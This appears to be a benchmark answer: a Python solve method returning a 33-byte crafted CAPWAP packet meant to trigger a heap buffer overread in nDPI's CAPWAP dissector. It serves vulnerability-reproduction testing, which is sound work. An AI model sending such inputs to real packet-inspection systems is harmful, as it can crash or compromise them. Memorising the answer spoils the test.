class Solution:
    def solve(self, src_path: str) -> bytes:
        # Crafted PoC for heap buffer overread in ndpi_search_setup_capwap
        # CAPWAP setup message with insufficient binding length to trigger overread
        poc = b'\x80\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
        assert len(poc) == 33
        return poc